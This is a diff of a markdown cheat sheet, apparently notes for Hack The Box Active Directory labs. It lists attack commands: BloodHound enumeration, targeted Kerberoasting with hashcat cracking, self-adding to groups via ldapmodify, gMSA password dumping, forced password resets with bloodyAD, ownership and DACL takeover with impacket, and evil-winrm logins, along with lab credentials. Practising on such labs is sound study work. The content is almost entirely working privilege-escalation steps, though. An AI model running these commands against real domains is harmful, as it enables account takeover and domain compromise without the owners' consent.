@@ -66,31 +66,52 @@ evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'abc@123'
 
 ----------------------------------------------------------------------------------------------------------------------
 **Bloodhound is a must!** with creds
+
 1. bloodhound-python -u name -p password -d domain.htb -ns ip -c all --zip
+2. 
 The next part is different everytime
-2. If you have **WriteSPN**:
+
+4. If you have **WriteSPN**:
+   
     you need this: https://github.com/ShutdownRepo/targetedKerberoast (git clone it)
    
    a. ntpdate -u IP
+   
    b. faketime "2025-06-09 16:22:00" python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --dc-ip 10.10.11.72
+   
    c. hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+   
   If you have **AddSelf**:
+  
    a. nano randomname.ldif
+   
      dn: CN=<thetargetname>,CN=Users,DC=<domain>,DC=htb
      changetype: modify
      add: member
      member: CN=<targetuser>,CN=Users,DC=<domain>,DC=htb
+     
    b. ldapmodify -x -D "domain\targetusername" -w <password> -H ldap://ip -f randomname.ldif
+ 
   If you have **ReadGMSAPassword**:
+  
    a. git clone : https://github.com/micahvandeusen/gMSADumper
+   
    b. python3 gMSADumper.py -u name -p password -l ip -d domain.htb
+   
    and you will get a hash but you cant crack it yet.
+   
   If you have **ForcechangePassword**:
+  
    a. bloodyAD -u 'userfrombefore$' -p ':1c37d00093dc2acf25a7z7f2d471fake4afdcthehashfrombefore' -d domain.htb --dc-ip ip set password sanm 'Password123!'
+   
   If you have **WriteOwner**:
+  
    a. impacket-owneredit -action write -new-owner 'sam' -target 'john' 'domain/sam:Password123!' -dc-ip ip
+   
    b. impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target-dn "CN=john,CN=Users,DC=domainname,DC=htb" 'domainname.htb/sam:Password123!' -dc-ip ip
+   
    c. bloodyAD -d domainanme.htb -u 'sam' -p 'Password123!' --dc-ip ip set password john 'NewPa$$word'
+   
    d. evil-winrm -i ip -u john -p 'NewPa$$word'
 
 
